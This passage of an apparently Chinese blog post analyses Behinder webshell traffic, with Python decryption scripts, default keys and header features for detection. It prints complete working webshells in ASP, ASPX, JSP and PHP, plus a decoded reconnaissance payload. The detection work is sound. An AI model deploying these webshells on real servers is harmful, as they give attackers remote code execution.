class="hljs-string">&quot;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&quot;</span>  # from POST body<br><br># <span class="hljs-number">1.</span> Base64 <span class="hljs-type">decode</span><br><span class="hljs-variable">ciphertext</span> <span class="hljs-operator">=</span> base64.b64decode(b64_ciphertext)<br><br># <span class="hljs-number">2.</span> XOR <span class="hljs-title function_">decrypt</span> <span class="hljs-params">(note: key index = (i+<span class="hljs-number">1</span>)</span> % <span class="hljs-number">16</span>)<br>plaintext = bytearray()<br><span class="hljs-keyword">for</span> i in <span class="hljs-title function_">range</span><span class="hljs-params">(len(ciphertext)</span>):<br>    k = key[(i + <span class="hljs-number">1</span>) % <span class="hljs-number">16</span>]<br>    plaintext.append(ciphertext[i] ^ ord(k))<br><br>print(plaintext.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, errors=<span class="hljs-string">&#x27;ignore&#x27;</span>))<br># 输出<span class="hljs-keyword">assert</span>|eval(base64_decode(<span class="hljs-string">&#x27;ZXJyb3JfcmVwb3J0aW5nKDApOw0KZnVuY3Rpb24gbWFpbigpIHsNCiAgICBvYl9zdGFydCgpOyBwaHBpbmZvKCk7ICRpbmZvID0gb2JfZ2V0X2NvbnRlbnRzKCk7IG9iX2VuZF9jbGVhbigpOw0KICAgICRkcml2ZUxpc3QgPSIiOw0KICAgIGlmIChzdHJpc3RyKFBIUF9PUywid2luZG93cyIpfHxzdHJpc3RyKFBIUF9PUywid2lubnQiKSkNCiAgICB7DQogICAgICAgIGZvcigkaT02NTskaTw9OTA7JGkrKykNCiAgICAJew0KICAgIAkJJGRyaXZlPWNocigkaSkuJzovJzsNCiAgICAJCWZpbGVfZXhpc3RzKCRkcml2ZSkgPyAkZHJpdmVMaXN0PSRkcml2ZUxpc3QuJGRyaXZlLiI7IjonJzsNCiAgICAJfQ0KICAgIH0NCgllbHNlDQoJew0KCQkkZHJpdmVMaXN0PSIvIjsNCgl9DQogICAgJGN1cnJlbnRQYXRoPWdldGN3ZCgpOw0KICAgIC8vZWNobyAicGhwaW5mbz0iLiRpbmZvLiJcbiIuImN1cnJlbnRQYXRoPSIuJGN1cnJlbnRQYXRoLiJcbiIuImRyaXZlTGlzdD0iLiRkcml2ZUxpc3Q7DQogICAgJG9zSW5mbz1QSFBfT1M7DQogICAgJHJlc3VsdD1hcnJheSgiYmFzaWNJbmZvIj0+YmFzZTY0X2VuY29kZSgkaW5mbyksImRyaXZlTGlzdCI9PmJhc2U2NF9lbmNvZGUoJGRyaXZlTGlzdCksImN1cnJlbnRQYXRoIj0+YmFzZTY0X2VuY29kZSgkY3VycmVudFBhdGgpLCJvc0luZm8iPT5iYXNlNjRfZW5jb2RlKCRvc0luZm8pKTsNCiAgICAvL2VjaG8ganNvbl9lbmNvZGUoJHJlc3VsdCk7DQogICAgc2Vzc2lvbl9zdGFydCgpOw0KICAgICRrZXk9JF9TRVNTSU9OWydrJ107DQogICAgLy9lY2hvIGpzb25fZW5jb2RlKCRyZXN1bHQpOw0KICAgIC8vZWNobyBvcGVuc3NsX2VuY3J5cHQoanNvbl9lbmNvZGUoJHJlc3VsdCksICJBRVMxMjgiLCAka2V5KTsNCiAgICBlY2hvIGVuY3J5cHQoanNvbl9lbmNvZGUoJHJlc3VsdCksICRrZXkpOw0KfQ0KDQpmdW5jdGlvbiBlbmNyeXB0KCRkYXRhLCRrZXkpDQp7DQoJaWYoIWV4dGVuc2lvbl9sb2FkZWQoJ29wZW5zc2wnKSkNCiAgICAJew0KICAgIAkJZm9yKCRpPTA7JGk8c3RybGVuKCRkYXRhKTskaSsrKSB7DQogICAgCQkJICRkYXRhWyRpXSA9ICRkYXRhWyRpXV4ka2V5WyRpKzEmMTVdOyANCiAgICAJCQl9DQoJCQlyZXR1cm4gJGRhdGE7DQogICAgCX0NCiAgICBlbHNlDQogICAgCXsNCiAgICAJCXJldHVybiBvcGVuc3NsX2VuY3J5cHQoJGRhdGEsICJBRVMxMjgiLCAka2V5KTsNCiAgICAJfQ0KfQ0KbWFpbigpOw==&#x27;</span>));<br><br></code></pre></td></tr></table></figure>
+
+<p>shell.asp（用的是xor加解密）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%<br>Response.CharSet = <span class="hljs-string">&quot;UTF-8&quot;</span> <br>If Request.ServerVariables(<span class="hljs-string">&quot;REQUEST_METHOD&quot;</span>)=<span class="hljs-string">&quot;GET&quot;</span> And Request.QueryString(<span class="hljs-string">&quot;pass&quot;</span>) Then<br>For a=<span class="hljs-number">1</span> To <span class="hljs-number">8</span><br>RANDOMIZE<br>k=Hex((<span class="hljs-number">255</span>-<span class="hljs-number">17</span>)*rnd+<span class="hljs-number">16</span>)+k<br>Next<br><span class="hljs-title function_">Session</span><span class="hljs-params">(<span class="hljs-string">&quot;k&quot;</span>)</span>=k<br>response.write(k)<br>Else<br>k=Session(<span class="hljs-string">&quot;k&quot;</span>)<br>size=Request.TotalBytes<br>content=Request.BinaryRead(size)<br>For i=<span class="hljs-number">1</span> To size<br>result=result&amp;Chr(ascb(midb(content,i,<span class="hljs-number">1</span>)) Xor <span class="hljs-title function_">Asc</span><span class="hljs-params">(Mid(k,(i and <span class="hljs-number">15</span>)</span>+<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)))<br>Next<br><span class="hljs-title function_">execute</span><span class="hljs-params">(result)</span><br>End If<br>%&gt;<br></code></pre></td></tr></table></figure>
+
+<p>解密python</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> sys<br><br>def <span class="hljs-title function_">decrypt_asp_xor</span><span class="hljs-params">(ciphertext: bytes, key: str)</span> -&gt; str:<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    解密 ASP WebShell 的 XOR 加密流量</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    :param ciphertext: 原始 POST body 二进制数据（bytes）</span><br><span class="hljs-string">    :param key: 16 字符密钥（str），例如 &quot;a1b2c3d4e5f6g7h8&quot;</span><br><span class="hljs-string">    :return: 解密后的 VBScript 源码（str）</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-title function_">len</span><span class="hljs-params">(key)</span> != <span class="hljs-number">16</span>:<br>        raise <span class="hljs-title function_">ValueError</span><span class="hljs-params">(<span class="hljs-string">&quot;密钥必须是 16 个字符！&quot;</span>)</span><br>    <br>    plaintext = bytearray()<br>    <span class="hljs-keyword">for</span> i in <span class="hljs-title function_">range</span><span class="hljs-params">(len(ciphertext)</span>):<br>        # 密钥循环：k[<span class="hljs-number">0</span>], k[<span class="hljs-number">1</span>], ..., k[<span class="hljs-number">15</span>], k[<span class="hljs-number">0</span>], ...<br>        k_byte = ord(key[i % <span class="hljs-number">16</span>])<br>        p_byte = ciphertext[i] ^ k_byte<br>        plaintext.append(p_byte)<br>    <br>    # 尝试用 UTF-<span class="hljs-number">8</span> 解码，忽略非法字符（VBScript 可能含非文本）<br>    <span class="hljs-keyword">return</span> plaintext.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, errors=<span class="hljs-string">&#x27;replace&#x27;</span>)<br><br># ======================<br># 使用示例<br># ======================<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    # === 配置区 ===<br>    KEY = <span class="hljs-string">&quot;a1b2c3d4e5f6g7h8&quot;</span>          # 替换为实际密钥（从 ?pass 获取）<br>    POST_BODY_FILE = <span class="hljs-string">&quot;post.bin&quot;</span>       # 替换为你的 POST body 二进制文件路径<br><br>    <span class="hljs-keyword">try</span>:<br>        with <span class="hljs-title function_">open</span><span class="hljs-params">(POST_BODY_FILE, <span class="hljs-string">&quot;rb&quot;</span>)</span> as f:<br>            encrypted_data = f.read()<br><br>        decrypted_code = decrypt_asp_xor(encrypted_data, KEY)<br>        print(<span class="hljs-string">&quot;✅ 解密成功！原始 VBScript 载荷：\n&quot;</span>)<br>        print(decrypted_code)<br><br>        # 可选：保存到文件<br>        with <span class="hljs-title function_">open</span><span class="hljs-params">(<span class="hljs-string">&quot;decrypted_payload.vbs&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>)</span> as out:<br>            out.write(decrypted_code)<br>        print(<span class="hljs-string">&quot;\n📝 已保存到 decrypted_payload.vbs&quot;</span>)<br><br>    except FileNotFoundError:<br>        print(f<span class="hljs-string">&quot;❌ 错误：未找到文件 &#123;POST_BODY_FILE&#125;&quot;</span>)<br>        print(<span class="hljs-string">&quot;请确保 POST body 是原始二进制（非 Base64）并保存为 .bin 文件&quot;</span>)<br>    except Exception as e:<br>        print(f<span class="hljs-string">&quot;❌ 解密失败: &#123;e&#125;&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>shell.aspx（与v1.2.1一模一样）</p>
+<p>解密方法，同样是<code>AES-128-CBC</code> 但这里IV不是全0（16进制），而是<code>key=IV</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%@ Page Language=<span class="hljs-string">&quot;C#&quot;</span> %&gt;&lt;%<span class="hljs-meta">@Import</span> Namespace=<span class="hljs-string">&quot;System.Reflection&quot;</span>%&gt;&lt;%<span class="hljs-keyword">if</span> (Request[<span class="hljs-string">&quot;pass&quot;</span>]!=<span class="hljs-literal">null</span>)&#123; Session.Add(<span class="hljs-string">&quot;k&quot;</span>, Guid.NewGuid().ToString().Replace(<span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).Substring(<span class="hljs-number">16</span>)); Response.Write(Session[<span class="hljs-number">0</span>]); <span class="hljs-keyword">return</span>;&#125;<span class="hljs-type">byte</span>[] k = Encoding.Default.GetBytes(Session[<span class="hljs-number">0</span>] + <span class="hljs-string">&quot;&quot;</span>),c = Request.BinaryRead(Request.ContentLength);Assembly.Load(<span class="hljs-keyword">new</span> <span class="hljs-title class_">System</span>.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, <span class="hljs-number">0</span>, c.Length)).CreateInstance(<span class="hljs-string">&quot;U&quot;</span>).Equals(<span class="hljs-built_in">this</span>);%&gt;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/mdimg/behinder/1765350778941-d47dd7e0-8787-4b42-a721-fda7e08d5efe.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="v3-x-4"><a href="#v3-x-4" class="headerlink" title="v3.x"></a>v3.x</h1><p><a target="_blank" rel="noopener" href="https://github.com/rebeyond/Behinder/releases/download/Behinder_v3.0_Beta_11_for_tools/Behinder_v3.0_Beta_11.t00ls.zip">https://github.com/rebeyond/Behinder/releases/download/Behinder_v3.0_Beta_11_for_tools/Behinder_v3.0_Beta_11.t00ls.zip</a></p>
+<p>环境：windows11+tomcat9+jdk1.8</p>
+<p>shell.jsp(兼容java7)</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%<span class="hljs-meta">@page</span> <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;</span>%&gt;&lt;%!<span class="hljs-keyword">class</span> <span class="hljs-title class_">U</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ClassLoader</span>&#123;U(ClassLoader c)&#123;<span class="hljs-built_in">super</span>(c);&#125;<span class="hljs-keyword">public</span> Class <span class="hljs-title function_">g</span><span class="hljs-params">(<span class="hljs-type">byte</span> []b)</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.defineClass(b,<span class="hljs-number">0</span>,b.length);&#125;&#125;%&gt;&lt;%<span class="hljs-keyword">if</span> (request.getMethod().equals(<span class="hljs-string">&quot;POST&quot;</span>))&#123;String k=<span class="hljs-string">&quot;e45e329feb5d925b&quot;</span>;<span class="hljs-comment">/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/</span>session.putValue(<span class="hljs-string">&quot;u&quot;</span>,k);Cipher c=Cipher.getInstance(<span class="hljs-string">&quot;AES&quot;</span>);c.init(<span class="hljs-number">2</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">SecretKeySpec</span>(k.getBytes(),<span class="hljs-string">&quot;AES&quot;</span>));<span class="hljs-keyword">new</span> <span class="hljs-title class_">U</span>(<span class="hljs-built_in">this</span>.getClass().getClassLoader()).g(c.doFinal(<span class="hljs-keyword">new</span> <span class="hljs-title class_">sun</span>.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%&gt;<br></code></pre></td></tr></table></figure>
+
+<p>使用了固定的密钥，没有了<code>?pass=xx</code>这一个特征请求和响应</p>
+<p><img src="/mdimg/behinder/1765271655346-c8cbe23e-4789-4d67-8e82-98504d1ea428.png" srcset="/img/loading.gif" lazyload></p>
+<p>同样可以自定义请求头</p>
+<p><img src="/mdimg/behinder/1765271283634-6973379f-6da2-414a-a0ad-a456a503d667.png" srcset="/img/loading.gif" lazyload></p>
+<p>特征header（辅助判断，因为请求头可以自定义）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">Content-Type: application/octet-stream<br>Pragma: no-cache<br>Cache-Control: no-cache<br></code></pre></td></tr></table></figure>
+
+<p>ua头不固定，每个session随机。但同一个会话的ua头是相同的，所以这里没有固定特征。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/</span><br></code></pre></td></tr></table></figure>
+
+<p>最终确定是冰蝎webshell，用key<code>e45e329feb5d925b</code>解密请求和响应，能解密就100%确定了。</p>
+<p><img src="/mdimg/behinder/1765272001875-1ca2bcc7-267e-498c-aa27-4a6980a4a80a.png" srcset="/img/loading.gif" lazyload></p>
+<p>但默认密钥解密不了就不一定不是冰蝎webshell，冰蝎v3.x设置的加解密密钥是自动获取连接密码的md5前16位</p>
+<p>而连接密码可以自定义</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%<span class="hljs-meta">@page</span> <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;</span>%&gt;&lt;%!<span class="hljs-keyword">class</span> <span class="hljs-title class_">U</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ClassLoader</span>&#123;U(ClassLoader c)&#123;<span class="hljs-built_in">super</span>(c);&#125;<span class="hljs-keyword">public</span> Class <span class="hljs-title function_">g</span><span class="hljs-params">(<span class="hljs-type">byte</span> []b)</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.defineClass(b,<span class="hljs-number">0</span>,b.length);&#125;&#125;%&gt;&lt;%<span class="hljs-keyword">if</span> (request.getMethod().equals(<span class="hljs-string">&quot;POST&quot;</span>))&#123;String k=<span class="hljs-string">&quot;098f6bcd4621d373&quot;</span>;<span class="hljs-comment">/*该密钥为连接密码32位md5值的前16位，这里是test*/</span>session.putValue(<span class="hljs-string">&quot;u&quot;</span>,k);Cipher c=Cipher.getInstance(<span class="hljs-string">&quot;AES&quot;</span>);c.init(<span class="hljs-number">2</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">SecretKeySpec</span>(k.getBytes(),<span class="hljs-string">&quot;AES&quot;</span>));<span class="hljs-keyword">new</span> <span class="hljs-title class_">U</span>(<span class="hljs-built_in">this</span>.getClass().getClassLoader()).g(c.doFinal(<span class="hljs-keyword">new</span> <span class="hljs-title class_">sun</span>.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%&gt;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/mdimg/behinder/1765272622687-3d248496-39e8-47ef-80f9-4374d4f7c355.png" srcset="/img/loading.gif" lazyload></p>
+<p>shell_java9.jsp （兼容java8+，只是换了base64编码库，加解密一样）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%<span class="hljs-meta">@page</span> <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;</span>%&gt;&lt;%!<span class="hljs-keyword">class</span> <span class="hljs-title class_">U</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ClassLoader</span>&#123;U(ClassLoader c)&#123;<span class="hljs-built_in">super</span>(c);&#125;<span class="hljs-keyword">public</span> Class <span class="hljs-title function_">g</span><span class="hljs-params">(<span class="hljs-type">byte</span> []b)</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.defineClass(b,<span class="hljs-number">0</span>,b.length);&#125;&#125;%&gt;&lt;%<span class="hljs-keyword">if</span> (request.getMethod().equals(<span class="hljs-string">&quot;POST&quot;</span>))&#123;String k=<span class="hljs-string">&quot;e45e329feb5d925b&quot;</span>;<span class="hljs-comment">/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/</span>session.putValue(<span class="hljs-string">&quot;u&quot;</span>,k);Cipher c=Cipher.getInstance(<span class="hljs-string">&quot;AES&quot;</span>);c.init(<span class="hljs-number">2</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">SecretKeySpec</span>(k.getBytes(),<span class="hljs-string">&quot;AES&quot;</span>));<span class="hljs-keyword">new</span> <span class="hljs-title class_">U</span>(<span class="hljs-built_in">this</span>.getClass().getClassLoader()).g(c.doFinal(Base64.getDecoder().decode(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%&gt;<br></code></pre></td></tr></table></figure>
+
+<p>shell.jspx.jsp  （jsp的xml格式，加解密完全一致）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;jsp:root xmlns:jsp=<span class="hljs-string">&quot;http://java.sun.com/JSP/Page&quot;</span> version=<span class="hljs-string">&quot;1.2&quot;</span>&gt;&lt;jsp:directive.page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;</span>/&gt;&lt;jsp:declaration&gt; <span class="hljs-keyword">class</span> <span class="hljs-title class_">U</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ClassLoader</span>&#123;U(ClassLoader c)&#123;<span class="hljs-built_in">super</span>(c);&#125;<span class="hljs-keyword">public</span> Class <span class="hljs-title function_">g</span><span class="hljs-params">(<span class="hljs-type">byte</span> []b)</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.defineClass(b,<span class="hljs-number">0</span>,b.length);&#125;&#125;&lt;/jsp:declaration&gt;&lt;jsp:scriptlet&gt;String k=<span class="hljs-string">&quot;e45e329feb5d925b&quot;</span>;session.putValue(<span class="hljs-string">&quot;u&quot;</span>,k);Cipher c=Cipher.getInstance(<span class="hljs-string">&quot;AES&quot;</span>);c.init(<span class="hljs-number">2</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">SecretKeySpec</span>((session.getValue(<span class="hljs-string">&quot;u&quot;</span>)+<span class="hljs-string">&quot;&quot;</span>).getBytes(),<span class="hljs-string">&quot;AES&quot;</span>));<span class="hljs-keyword">new</span> <span class="hljs-title class_">U</span>(<span class="hljs-built_in">this</span>.getClass().getClassLoader()).g(c.doFinal(<span class="hljs-keyword">new</span> <span class="hljs-title class_">sun</span>.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&lt;/jsp:scriptlet&gt;&lt;/jsp:root&gt;<br></code></pre></td></tr></table></figure>
+
+<p>shell.php （xor加密部分与冰蝎2.x的不一样）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;?php<br><span class="hljs-meta">@error_reporting(0)</span>;<br>session_start();<br>    $key=<span class="hljs-string">&quot;e45e329feb5d925b&quot;</span>; <span class="hljs-comment">//该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond</span><br>	$_SESSION[<span class="hljs-string">&#x27;k&#x27;</span>]=$key;<br>	session_write_close();<br>	$post=file_get_contents(<span class="hljs-string">&quot;php://input&quot;</span>);<br>	<span class="hljs-keyword">if</span>(!extension_loaded(<span class="hljs-string">&#x27;openssl&#x27;</span>))<br>	&#123;<br>		$t=<span class="hljs-string">&quot;base64_&quot;</span>.<span class="hljs-string">&quot;decode&quot;</span>;<br>		$post=$t($post.<span class="hljs-string">&quot;&quot;</span>);<br>		<br>		<span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;strlen($post);$i++) &#123;<br>    			 $post[$i] = $post[$i]^$key[$i+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>]; <br>    			&#125;<br>	&#125;<br>	<span class="hljs-keyword">else</span><br>	&#123;<br>		$post=openssl_decrypt($post, <span class="hljs-string">&quot;AES128&quot;</span>, $key);<br>	&#125;<br>    $arr=explode(<span class="hljs-string">&#x27;|&#x27;</span>,$post);<br>    $func=$arr[<span class="hljs-number">0</span>];<br>    $params=$arr[<span class="hljs-number">1</span>];<br>	<span class="hljs-keyword">class</span> <span class="hljs-title class_">C</span>&#123;<span class="hljs-keyword">public</span> function <span class="hljs-title function_">__invoke</span><span class="hljs-params">($p)</span> &#123;eval($p.<span class="hljs-string">&quot;&quot;</span>);&#125;&#125;<br>    <span class="hljs-meta">@call_user_func(new C(),$params)</span>;<br>?&gt;<br><br></code></pre></td></tr></table></figure>
+
+<p>解密python</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> base64<br><br># 固定密钥（冰蝎默认）<br>key = <span class="hljs-string">&quot;e45e329feb5d925b&quot;</span><br><br># 替换为你的 Base64 加密 payload（来自 POST body）<br>b64_payload = <span class="hljs-string">&quot;YOUR_BASE64_HERE&quot;</span><br><br># <span class="hljs-number">1.</span> Base64 解码<br>cipher_bytes = base64.b64decode(b64_payload)<br><br># <span class="hljs-number">2.</span> XOR 解密（注意：索引是 (i+<span class="hljs-number">1</span>) &amp; <span class="hljs-number">15</span>）<br>plain = bytearray()<br><span class="hljs-keyword">for</span> i in <span class="hljs-title function_">range</span><span class="hljs-params">(len(cipher_bytes)</span>):<br>    k = ord(key[(i + <span class="hljs-number">1</span>) &amp; <span class="hljs-number">15</span>])      # 关键：i+<span class="hljs-number">1</span><br>    plain.append(cipher_bytes[i] ^ k)<br><br># <span class="hljs-number">3.</span> 输出结果<br>result = plain.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, errors=<span 